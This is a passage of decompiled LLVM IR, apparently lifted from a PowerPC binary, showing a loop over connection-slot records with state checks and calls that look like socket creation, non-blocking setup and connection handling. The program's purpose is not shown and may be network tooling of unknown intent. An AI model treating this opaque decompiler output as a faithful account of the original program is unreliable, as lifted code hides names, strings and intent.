  store i32 %v3_10000524, i32* %r3.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v2_1000052c = load i32, i32* @r31, align 4
  %v3_1000052c = add i32 %v2_1000052c, 532
  %v4_1000052c = inttoptr i32 %v3_1000052c to i8*
  store i8 47, i8* %v4_1000052c, align 1
  %v0_10000534.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10000530

dec_label_pc_10000530:                            ; preds = %dec_label_pc_100004c8, %dec_label_pc_10000510
  %v0_10000534 = phi i32 [ %v0_10000504, %dec_label_pc_100004c8 ], [ %v0_10000534.pre, %dec_label_pc_10000510 ]
  %v0_10000530 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10000530, i32* %r4.global-to-local, align 4
  %v1_10000534 = add i32 %v0_10000534, 1440
  store i32 %v1_10000534, i32* @r3, align 4
  store i32 268436796, i32* %lr.global-to-local, align 4
  %v2_10000538 = inttoptr i32 %v1_10000534 to i8*
  %v3_10000538 = call i32 @function_10007504(i8* %v2_10000538, i32 %v0_10000530)
  %v0_1000053c = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_1000053c, i32* %r4.global-to-local, align 4
  %v0_10000540 = load i32, i32* @r31, align 4
  %v1_10000540 = add i32 %v0_10000540, 1431
  store i32 %v1_10000540, i32* @r3, align 4
  store i32 268436808, i32* %lr.global-to-local, align 4
  %v2_10000544 = inttoptr i32 %v1_10000540 to i8*
  %v3_10000544 = call i32 @function_10007504(i8* %v2_10000544, i32 %v0_1000053c)
  %v0_10000548 = load i32, i32* @r31, align 4
  %v1_10000548 = add i32 %v0_10000548, 789
  store i32 %v1_10000548, i32* @r3, align 4
  %v0_1000054c = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_1000054c, i32* %r4.global-to-local, align 4
  store i32 268436820, i32* %lr.global-to-local, align 4
  %v2_10000550 = inttoptr i32 %v1_10000548 to i8*
  %v3_10000550 = call i32 @function_10007504(i8* %v2_10000550, i32 %v0_1000054c)
  store i32 %v3_10000550, i32* %r3.global-to-local, align 4
  %v0_10000554 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000554 = add i32 %v0_10000554, 20
  %v2_10000554 = inttoptr i32 %v1_10000554 to i8*
  %v3_10000554 = load i8, i8* %v2_10000554, align 1
  %v4_10000554 = zext i8 %v3_10000554 to i32
  store i32 %v4_10000554, i32* %r0.global-to-local, align 4
  %v1_10000558 = icmp ult i8 %v3_10000554, 31
  %v2_10000558 = icmp ugt i8 %v3_10000554, 31
  %v3_10000558 = icmp eq i8 %v3_10000554, 31
  store i1 %v1_10000558, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000558, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000558, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10000558, label %dec_label_pc_10000578, label %dec_label_pc_10000560

dec_label_pc_10000560:                            ; preds = %dec_label_pc_10000530
  %v1_10000560 = add i32 %v0_10000554, 16
  %v2_10000560 = inttoptr i32 %v1_10000560 to i32*
  %v3_10000560 = load i32, i32* %v2_10000560, align 4
  store i32 %v3_10000560, i32* %r29.global-to-local, align 4
  store i32 268436840, i32* %lr.global-to-local, align 4
  %v0_10000564 = call i32 @function_10006318()
  store i32 %v0_10000564, i32* %r3.global-to-local, align 4
  %v0_10000568 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000568 = add i32 %v0_10000568, 20
  %v2_10000568 = inttoptr i32 %v1_10000568 to i8*
  %v3_10000568 = load i8, i8* %v2_10000568, align 1
  %v4_10000568 = zext i8 %v3_10000568 to i32
  store i32 %v4_10000568, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10000568, 64
  %v2_1000056c = zext i8 %tmp to i32
  %v3_1000056c = lshr i32 %v0_10000564, %v2_1000056c
  store i32 %v3_1000056c, i32* %r3.global-to-local, align 4
  %v0_10000570 = load i32, i32* %r29.global-to-local, align 4
  %v2_10000570 = add i32 %v3_1000056c, %v0_10000570
  store i32 %v2_10000570, i32* %r29.global-to-local, align 4
  %v1_10000574 = load i32, i32* @r31, align 4
  %v2_10000574 = add i32 %v1_10000574, 16
  %v3_10000574 = inttoptr i32 %v2_10000574 to i32*
  store i32 %v2_10000570, i32* %v3_10000574, align 4
  br label %dec_label_pc_10000578

dec_label_pc_10000578:                            ; preds = %dec_label_pc_10000530, %dec_label_pc_10000560
  store i32 ptrtoint (i32* @global_var_1000057c.20 to i32), i32* %lr.global-to-local, align 4
  %v0_10000578 = call i32 @function_10006318()
  %v1_10000578 = sext i32 %v0_10000578 to i64
  %v5_10000584 = mul nuw nsw i64 %v1_10000578, 3435973837
  %v1_100005881 = udiv i64 %v5_10000584, 17179869184
  %v1_10000588 = trunc i64 %v1_100005881 to i32
  %v1_1000058c = mul i32 %v1_10000588, 5
  store i32 %v1_1000058c, i32* %r0.global-to-local, align 4
  %v3_10000590 = sub i32 %v0_10000578, %v1_1000058c
  store i32 %v3_10000590, i32* %r3.global-to-local, align 4
  %v1_10000594 = icmp ult i32 %v3_10000590, 4
  %v2_10000594 = icmp ugt i32 %v3_10000590, 4
  %v3_10000594 = icmp eq i32 %v3_10000590, 4
  store i1 %v1_10000594, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000594, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000594, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10000594, label %dec_label_pc_10001c70, label %dec_label_pc_1000059c

dec_label_pc_1000059c:                            ; preds = %dec_label_pc_10000578
  store i32 ptrtoint (i32* @global_var_1000a800.21 to i32), i32* %r9.global-to-local, align 4
  %v1_100005a0 = mul i32 %v3_10000590, 4
  store i32 %v1_100005a0, i32* %r11.global-to-local, align 4
  %v2_100005a4 = add i32 %v1_100005a0, ptrtoint (i32* @global_var_1000a800.21 to i32)
  %v3_100005a4 = inttoptr i32 %v2_100005a4 to i32*
  %v4_100005a4 = load i32, i32* %v3_100005a4, align 4
  %v2_100005a8 = add i32 %v4_100005a4, ptrtoint (i32* @global_var_1000a800.21 to i32)
  store i32 %v2_100005a8, i32* %r0.global-to-local, align 4
  store i32 %v2_100005a8, i32* %ctr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_100005a8)
  br label %dec_label_pc_100005b4

dec_label_pc_100005b4:                            ; preds = %dec_label_pc_1000043c, %dec_label_pc_1000059c
  %v0_100005b4 = load i32, i32* @r1, align 4
  %v1_100005b4 = add i32 %v0_100005b4, 20804
  %v2_100005b4 = inttoptr i32 %v1_100005b4 to i32*
  %v3_100005b4 = load i32, i32* %v2_100005b4, align 4
  store i32 %v3_100005b4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100005c4.preheader

dec_label_pc_100005c4.preheader:                  ; preds = %dec_label_pc_100005b4, %dec_label_pc_10001c8c
  %storemerge10.in = phi i32 [ %v0_100005b4, %dec_label_pc_100005b4 ], [ %v0_10001c8c, %dec_label_pc_10001c8c ]
  %storemerge9.in = phi i32 [ %v3_100005b4, %dec_label_pc_100005b4 ], [ %v3_10001c8c, %dec_label_pc_10001c8c ]
  %storemerge11 = add i32 %storemerge10.in, 8
  store i32 %storemerge11, i32* %r18.global-to-local, align 4
  %storemerge10 = add i32 %storemerge10.in, 300
  store i32 %storemerge10, i32* %r22.global-to-local, align 4
  %storemerge = icmp eq i32 %storemerge9.in, 0
  store i1 %storemerge, i1* %cr3_eq.global-to-local, align 1
  br label %dec_label_pc_100005c4

dec_label_pc_100005c4:                            ; preds = %dec_label_pc_1000079c, %dec_label_pc_10000794, %dec_label_pc_10000610, %dec_label_pc_10000824, %dec_label_pc_100005c4.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100005cc.22 to i32), i32* @lr, align 4
  %v0_100005c8 = call i32 @function_10008138()
  store i32 %v0_100005c8, i32* %r3.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v0_100005c8, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 44, i32* %r11.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v2_100005e897 = load i32, i32* @r1, align 4
  %v3_100005e898 = add i32 %v2_100005e897, 44
  %v4_100005e899 = inttoptr i32 %v3_100005e898 to i32*
  store i32 0, i32* %v4_100005e899, align 4
  %v0_100005ec100 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100005ec101 = add i32 %v0_100005ec100, -1
  store i32 %v1_100005ec101, i32* %ctr.global-to-local, align 4
  %v2_100005ec102 = icmp eq i32 %v1_100005ec101, 0
  br i1 %v2_100005ec102, label %dec_label_pc_100005f0, label %dec_label_pc_100005e0.dec_label_pc_100005e0_crit_edge

dec_label_pc_100005e0.dec_label_pc_100005e0_crit_edge: ; preds = %dec_label_pc_100005c4, %dec_label_pc_100005e0.dec_label_pc_100005e0_crit_edge
  %v0_100005e0.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_100005e8.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_100005e0 = add i32 %v0_100005e0.pre, 44
  store i32 %v1_100005e0, i32* %r11.global-to-local, align 4
  %v1_100005e4 = add i32 %v0_100005e0.pre, 4
  store i32 %v1_100005e4, i32* %r9.global-to-local, align 4
  %v2_100005e8 = load i32, i32* @r1, align 4
  %v3_100005e8 = add i32 %v2_100005e8, %v1_100005e0
  %v4_100005e8 = inttoptr i32 %v3_100005e8 to i32*
  store i32 %v0_100005e8.pre, i32* %v4_100005e8, align 4
  %v0_100005ec = load i32, i32* %ctr.global-to-local, align 4
  %v1_100005ec = add i32 %v0_100005ec, -1
  store i32 %v1_100005ec, i32* %ctr.global-to-local, align 4
  %v2_100005ec = icmp eq i32 %v1_100005ec, 0
  br i1 %v2_100005ec, label %dec_label_pc_100005f0, label %dec_label_pc_100005e0.dec_label_pc_100005e0_crit_edge

dec_label_pc_100005f0:                            ; preds = %dec_label_pc_100005e0.dec_label_pc_100005e0_crit_edge, %dec_label_pc_100005c4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 172, i32* %r11.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v2_10000608103 = load i32, i32* @r1, align 4
  %v3_10000608104 = add i32 %v2_10000608103, 172
  %v4_10000608105 = inttoptr i32 %v3_10000608104 to i32*
  store i32 0, i32* %v4_10000608105, align 4
  %v0_1000060c106 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000060c107 = add i32 %v0_1000060c106, -1
  store i32 %v1_1000060c107, i32* %ctr.global-to-local, align 4
  %v2_1000060c108 = icmp eq i32 %v1_1000060c107, 0
  br i1 %v2_1000060c108, label %dec_label_pc_10000610, label %dec_label_pc_10000600.dec_label_pc_10000600_crit_edge

dec_label_pc_10000600.dec_label_pc_10000600_crit_edge: ; preds = %dec_label_pc_100005f0, %dec_label_pc_10000600.dec_label_pc_10000600_crit_edge
  %v0_10000600.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10000608.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_10000600 = add i32 %v0_10000600.pre, 172
  store i32 %v1_10000600, i32* %r11.global-to-local, align 4
  %v1_10000604 = add i32 %v0_10000600.pre, 4
  store i32 %v1_10000604, i32* %r9.global-to-local, align 4
  %v2_10000608 = load i32, i32* @r1, align 4
  %v3_10000608 = add i32 %v2_10000608, %v1_10000600
  %v4_10000608 = inttoptr i32 %v3_10000608 to i32*
  store i32 %v0_10000608.pre, i32* %v4_10000608, align 4
  %v0_1000060c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000060c = add i32 %v0_1000060c, -1
  store i32 %v1_1000060c, i32* %ctr.global-to-local, align 4
  %v2_1000060c = icmp eq i32 %v1_1000060c, 0
  br i1 %v2_1000060c, label %dec_label_pc_10000610, label %dec_label_pc_10000600.dec_label_pc_10000600_crit_edge

dec_label_pc_10000610:                            ; preds = %dec_label_pc_10000600.dec_label_pc_10000600_crit_edge, %dec_label_pc_100005f0
  %v0_10000610 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10000610 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10000610 = or i1 %v0_10000610, %v1_10000610
  br i1 %v2_10000610, label %dec_label_pc_100005c4, label %dec_label_pc_10000614

dec_label_pc_10000614:                            ; preds = %dec_label_pc_10000610
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 268500992, i32* %r11.global-to-local, align 4
  %v0_1000061c = load i32, i32* @r1, align 4
  %v1_1000061c = add i32 %v0_1000061c, 20796
  %v2_1000061c = inttoptr i32 %v1_1000061c to i32*
  %v3_1000061c = load i32, i32* %v2_1000061c, align 4
  store i32 %v3_1000061c, i32* %r30.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a7b0.23 to i32), i32* %r16.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a7ac.24 to i32), i32* %r24.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  store i32 1, i32* %r23.global-to-local, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 -1, i32* %r19.global-to-local, align 4
  br label %dec_label_pc_10000688

dec_label_pc_10000640:                            ; preds = %dec_label_pc_10000694
  %v2_10000640 = icmp ugt i8 %v3_10000688, 2
  %v3_10000640 = icmp eq i8 %v3_10000688, 2
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000640, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000640, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000640, label %dec_label_pc_10000c94, label %dec_label_pc_10000648

dec_label_pc_10000648:                            ; preds = %dec_label_pc_10000640
  %v1_10000648 = icmp ult i8 %v3_10000688, 4
  %v2_10000648 = icmp ugt i8 %v3_10000688, 4
  %v3_10000648 = icmp eq i8 %v3_10000688, 4
  store i1 %v1_10000648, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000648, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000648, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000648, label %dec_label_pc_100008b0, label %dec_label_pc_10000650

dec_label_pc_10000650:                            ; preds = %dec_label_pc_10000648
  %v1_10000650 = icmp ult i8 %v3_10000688, 6
  %v2_10000650 = icmp ugt i8 %v3_10000688, 6
  %v3_10000650 = icmp eq i8 %v3_10000688, 6
  store i1 %v1_10000650, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000650, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000650, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000650, label %dec_label_pc_10000c5c, label %dec_label_pc_10000658

dec_label_pc_10000658:                            ; preds = %dec_label_pc_10000650
  %v1_10000658 = icmp ult i8 %v3_10000688, 7
  %v2_10000658 = icmp ugt i8 %v3_10000688, 7
  %v3_10000658 = icmp eq i8 %v3_10000688, 7
  store i1 %v1_10000658, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000658, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000658, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000658, label %dec_label_pc_10000c5c, label %dec_label_pc_10000660

dec_label_pc_10000660:                            ; preds = %dec_label_pc_10000658
  %v1_10000660 = icmp ult i8 %v3_10000688, 10
  %v2_10000660 = icmp ugt i8 %v3_10000688, 10
  %v3_10000660 = icmp eq i8 %v3_10000688, 10
  store i1 %v1_10000660, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000660, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000660, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000660, label %dec_label_pc_10000c5c, label %dec_label_pc_10000668

dec_label_pc_10000668:                            ; preds = %dec_label_pc_10000c94, %dec_label_pc_10000660
  %v1_10000668 = inttoptr i32 %v2_10000c8c to i32*
  %v2_10000668 = load i32, i32* %v1_10000668, align 4
  store i32 %v2_10000668, i32* %r3.global-to-local, align 4
  %v0_1000066c = load i32, i32* %r17.global-to-local, align 4
  %v1_1000066c = trunc i32 %v0_1000066c to i8
  store i8 %v1_1000066c, i8* %v2_10000688, align 1
  store i32 268437108, i32* @lr, align 4
  %v0_10000670 = call i32 @function_10007d68()
  store i32 %v0_10000670, i32* %r3.global-to-local, align 4
  %v0_10000674 = load i32, i32* %r19.global-to-local, align 4
  %v1_10000674 = load i32, i32* %r30.global-to-local, align 4
  %v2_10000674 = inttoptr i32 %v1_10000674 to i32*
  store i32 %v0_10000674, i32* %v2_10000674, align 4
  br label %dec_label_pc_10000678

dec_label_pc_10000678:                            ; preds = %dec_label_pc_10000758, %dec_label_pc_10000c5c, %dec_label_pc_10000c00, %dec_label_pc_100006c0, %dec_label_pc_10000668
  %v0_10000678 = load i32, i32* %r28.global-to-local, align 4
  %v1_10000678 = add i32 %v0_10000678, 1
  store i32 %v1_10000678, i32* %r28.global-to-local, align 4
  %v0_1000067c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000067c = add i32 %v0_1000067c, 3140
  store i32 %v1_1000067c, i32* %r30.global-to-local, align 4
  %v0_10000680 = load i32, i32* %r21.global-to-local, align 4
  %v2_10000680 = icmp slt i32 %v0_10000680, %v1_10000678
  %v3_10000680 = icmp sgt i32 %v0_10000680, %v1_10000678
  %v4_10000680 = icmp eq i32 %v0_10000680, %v1_10000678
  store i1 %v2_10000680, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000680, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10000680, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10000680, label %dec_label_pc_10000678.dec_label_pc_10000794_crit_edge, label %dec_label_pc_10000688

dec_label_pc_10000678.dec_label_pc_10000794_crit_edge: ; preds = %dec_label_pc_10000678
  %v0_10000794.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10000794

dec_label_pc_10000688:                            ; preds = %dec_label_pc_10000784, %dec_label_pc_10000678, %dec_label_pc_10000614
  %v2_10000c8c = phi i32 [ %v3_1000061c, %dec_label_pc_10000614 ], [ %v1_1000067c, %dec_label_pc_10000678 ], [ %v1_10000788, %dec_label_pc_10000784 ]
  %v1_10000688 = add i32 %v2_10000c8c, 4
  %v2_10000688 = inttoptr i32 %v1_10000688 to i8*
  %v3_10000688 = load i8, i8* %v2_10000688, align 1
  %v4_10000688 = zext i8 %v3_10000688 to i32
  store i32 %v4_10000688, i32* %r0.global-to-local, align 4
  %v1_1000068c = icmp eq i8 %v3_10000688, 0
  %v2_1000068c = icmp ugt i8 %v3_10000688, 1
  %v3_1000068c = icmp eq i8 %v3_10000688, 1
  store i1 %v1_1000068c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000068c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000068c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000068c, label %dec_label_pc_1000089c, label %dec_label_pc_10000694

dec_label_pc_10000694:                            ; preds = %dec_label_pc_10000688
  %v2_10000694 = icmp ne i8 %v3_10000688, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000694, i1* %cr7_gt.global-to-local, align 1
  store i1 %v1_1000068c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_1000068c, label %dec_label_pc_1000069c, label %dec_label_pc_10000640

dec_label_pc_1000069c:                            ; preds = %dec_label_pc_10000694, %dec_label_pc_10000c8c
  %v0_1000069c = phi i32 [ %v2_10000c8c, %dec_label_pc_10000694 ], [ %v0_1000069c.pre, %dec_label_pc_10000c8c ]
  %v1_1000069c = inttoptr i32 %v0_1000069c to i32*
  %v2_1000069c = load i32, i32* %v1_1000069c, align 4
  store i32 %v2_1000069c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100006a4 = load i32, i32* @r1, align 4
  %v2_100006a4 = add i32 %v1_100006a4, 40
  %v3_100006a4 = inttoptr i32 %v2_100006a4 to i32*
  store i32 0, i32* %v3_100006a4, align 4
  %v0_100006a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_100006a8 = icmp slt i32 %v0_100006a8, -1
  %v2_100006a8 = icmp sgt i32 %v0_100006a8, -1
  %v3_100006a8 = icmp eq i32 %v0_100006a8, -1
  store i1 %v1_100006a8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100006a8, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100006a8, i1* %cr7_eq.global-to-local, align 1
  %v0_100006ac = load i32, i32* %r0.global-to-local, align 4
  %v1_100006ac = load i32, i32* @r1, align 4
  %v2_100006ac = add i32 %v1_100006ac, 28
  %v3_100006ac = inttoptr i32 %v2_100006ac to i32*
  store i32 %v0_100006ac, i32* %v3_100006ac, align 4
  %v0_100006b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100006b0 = load i32, i32* @r1, align 4
  %v2_100006b0 = add i32 %v1_100006b0, 32
  %v3_100006b0 = inttoptr i32 %v2_100006b0 to i32*
  store i32 %v0_100006b0, i32* %v3_100006b0, align 4
  %v0_100006b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100006b4 = load i32, i32* @r1, align 4
  %v2_100006b4 = add i32 %v1_100006b4, 36
  %v3_100006b4 = inttoptr i32 %v2_100006b4 to i32*
  store i32 %v0_100006b4, i32* %v3_100006b4, align 4
  br i1 %v3_100006a8, label %dec_label_pc_100006c0, label %dec_label_pc_100006bc

dec_label_pc_100006bc:                            ; preds = %dec_label_pc_1000069c
  store i32 ptrtoint ([3 x i8]* @global_var_100006c0.25 to i32), i32* @lr, align 4
  %v0_100006bc = call i32 @function_10007d68()
  store i32 %v0_100006bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100006c0

dec_label_pc_100006c0:                            ; preds = %dec_label_pc_1000069c, %dec_label_pc_100006bc
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 268437200, i32* @lr, align 4
  %v3_100006cc = call i32 @function_10008b34(i32 2, i32 1, i32 0)
  store i32 %v3_100006cc, i32* %r3.global-to-local, align 4
  %v1_100006d0 = icmp slt i32 %v3_100006cc, -1
  %v2_100006d0 = icmp sgt i32 %v3_100006cc, -1
  %v3_100006d0 = icmp eq i32 %v3_100006cc, -1
  store i1 %v1_100006d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100006d0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100006d0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_100006cc, i32* @r31, align 4
  %v1_100006d8 = load i32, i32* %r30.global-to-local, align 4
  %v2_100006d8 = inttoptr i32 %v1_100006d8 to i32*
  store i32 %v3_100006cc, i32* %v2_100006d8, align 4
  br i1 %v3_100006d0, label %dec_label_pc_10000678, label %dec_label_pc_100006e0

dec_label_pc_100006e0:                            ; preds = %dec_label_pc_100006c0
  store i32 3, i32* @r4, align 4
  store i32 268437232, i32* @lr, align 4
  %v1_100006ec = call i32 @function_10007c38(i32 3)
  store i32 4, i32* @r4, align 4
  %v0_100006f8 = load i32, i32* @r31, align 4
  store i32 %v0_100006f8, i32* %r3.global-to-local, align 4
  store i32 268437252, i32* @lr, align 4
  %v2_10000700 = call i32 @function_10007c38(i32 %v0_100006f8)
  store i32 %v2_10000700, i32* %r3.global-to-local, align 4
  %v0_10000704 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000704 = inttoptr i32 %v0_10000704 to i32*
  %v2_10000704 = load i32, i32* %v1_10000704, align 4
  store i32 %v2_10000704, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 65535, i32* %r11.global-to-local, align 4
  %v0_10000718 = load i32, i32* %r18.global-to-local, align 4
  %v1_10000720 = load i32, i32* @r1, align 4
  %v2_10000720 = add i32 %v1_10000720, 8
  %v3_10000720 = inttoptr i32 %v2_10000720 to i32*
  store i32 65535, i32* %v3_10000720, align 4
  store i32 268437288, i32* @lr, align 4
  %v5_10000724 = call i32 @function_10008af8(i32 %v2_10000704, i32 0, i32 8, i32 %v0_10000718, i32 4)
  store i32 %v5_10000724, i32* %r3.global-to-local, align 4
  %v0_10000728 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000728 = add i32 %v0_10000728, 16
  %v2_10000728 = inttoptr i32 %v1_10000728 to i32*
  %v3_10000728 = load i32, i32* %v2_10000728, align 4
  store i32 %v3_10000728, i32* %r9.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10000730 = inttoptr i32 %v0_10000728 to i32*
  %v2_10000730 = load i32, i32* %v1_10000730, align 4
  store i32 %v2_10000730, i32* @r3, align 4
  %v0_10000734 = load i32, i32* @r1, align 4
  %v1_10000734 = add i32 %v0_10000734, 28
  store i32 %v1_10000734, i32* %r4.global-to-local, align 4
  %v2_10000738 = add i32 %v0_10000734, 32
  %v3_10000738 = inttoptr i32 %v2_10000738 to i32*
  store i32 %v3_10000728, i32* %v3_10000738, align 4
  %v0_10000740 = load i32, i32* %r0.global-to-local, align 4
  %v1_10000740 = trunc i32 %v0_10000740 to i8
  %v2_10000740 = load i32, i32* %r30.global-to-local, align 4
  %v3_10000740 = add i32 %v2_10000740, 4
  %v4_10000740 = inttoptr i32 %v3_10000740 to i8*
  store i8 %v1_10000740, i8* %v4_10000740, align 1
  %v0_10000744 = load i32, i32* %r25.global-to-local, align 4
  %v1_10000744 = load i32, i32* %r30.global-to-local, align 4
  %v2_10000744 = add i32 %v1_10000744, 8
  %v3_10000744 = inttoptr i32 %v2_10000744 to i32*
  store i32 %v0_10000744, i32* %v3_10000744, align 4
  %v0_10000748 = load i32, i32* %r0.global-to-local, align 4
  %v1_10000748 = trunc i32 %v0_10000748 to i16
  %v2_10000748 = load i32, i32* @r1, align 4
  %v3_10000748 = add i32 %v2_10000748, 28
  %v4_10000748 = inttoptr i32 %v3_10000748 to i16*
  store i16 %v1_10000748, i16* %v4_10000748, align 2
  %v0_1000074c = load i32, i32* @r1, align 4
  %v1_1000074c = add i32 %v0_1000074c, 20800
  %v2_1000074c = inttoptr i32 %v1_1000074c to i32*
  %v3_1000074c = load i32, i32* %v2_1000074c, align 4
  store i32 %v3_1000074c, i32* %r0.global-to-local, align 4
  %v1_10000750 = trunc i32 %v3_1000074c to i16
  %v3_10000750 = add i32 %v0_1000074c, 30
  %v4_10000750 = inttoptr i32 %v3_10000750 to i16*
  store i16 %v1_10000750, i16* %v4_10000750, align 2
  store i32 268437336, i32* @lr, align 4
  %v0_10000754 = call i32 @function_10008934()
  store i32 %v0_10000754, i32* %r3.global-to-local, align 4
  %v0_10000758.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10000758

dec_label_pc_10000758:                            ; preds = %dec_label_pc_10000c94, %dec_label_pc_100006e0
  %v0_10000758 = phi i32 [ %v2_10000c8c, %dec_label_pc_10000c94 ], [ %v0_10000758.pre, %dec_label_pc_100006e0 ]
  %v1_10000758 = inttoptr i32 %v0_10000758 to i32*
  %v2_10000758 = load i32, i32* %v1_10000758, align 4
  %v1_1000075c = call i32 @__asm_rlwinm(i32 %v2_10000758, i32 29, i32 3, i32 29)
  %v0_10000760 = load i32, i32* %r26.global-to-local, align 4
  %v2_10000760 = icmp slt i32 %v0_10000760, %v2_10000758
  %v3_10000760 = icmp sgt i32 %v0_10000760, %v2_10000758
  %v4_10000760 = icmp eq i32 %v0_10000760, %v2_10000758
  store i1 %v2_10000760, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000760, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10000760, i1* %cr7_eq.global-to-local, align 1
  %v1_10000764 = load i32, i32* %r18.global-to-local, align 4
  %v2_10000764 = add i32 %v1_10000764, %v1_1000075c
  store i32 %v2_10000764, i32* %r11.global-to-local, align 4
  %v1_10000768 = urem i32 %v2_10000758, 32
  store i32 %v1_10000768, i32* %r0.global-to-local, align 4
  %v1_1000076c = add i32 %v2_10000764, 164
  %v2_1000076c = inttoptr i32 %v1_1000076c to i32*
  %v3_1000076c = load i32, i32* %v2_1000076c, align 4
  %v0_10000770 = load i32, i32* %r23.global-to-local, align 4
  %v3_10000770 = shl i32 %v0_10000770, %v1_10000768
  store i32 %v3_10000770, i32* %r0.global-to-local, align 4
  %v2_10000774 = or i32 %v3_10000770, %v3_1000076c
  store i32 %v2_10000774, i32* %r9.global-to-local, align 4
  store i32 %v2_10000774, i32* %v2_1000076c, align 4
  br i1 %v2_10000760, label %dec_label_pc_10000780, label %dec_label_pc_10000678

dec_label_pc_10000780:                            ; preds = %dec_label_pc_10000758
  %v1_10000780 = add i32 %v2_10000758, 1
  store i32 %v1_10000780, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10000784

dec_label_pc_10000784:                            ; preds = %dec_label_pc_10000c84, %dec_label_pc_10000c54, %dec_label_pc_10000780
  %v0_1000079426 = phi i32 [ %v1_10000c84, %dec_label_pc_10000c84 ], [ %v1_10000c54, %dec_label_pc_10000c54 ], [ %v1_10000780, %dec_label_pc_10000780 ]
  %v0_10000784 = load i32, i32* %r28.global-to-local, align 4
  %v1_10000784 = add i32 %v0_10000784, 1
  store i32 %v1_10000784, i32* %r28.global-to-local, align 4
  %v0_10000788 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000788 = add i32 %v0_10000788, 3140
  store i32 %v1_10000788, i32* %r30.global-to-local, align 4
  %v0_1000078c = load i32, i32* %r21.global-to-local, align 4
  %v2_1000078c = icmp slt i32 %v0_1000078c, %v1_10000784
  %v3_1000078c = icmp sgt i32 %v0_1000078c, %v1_10000784
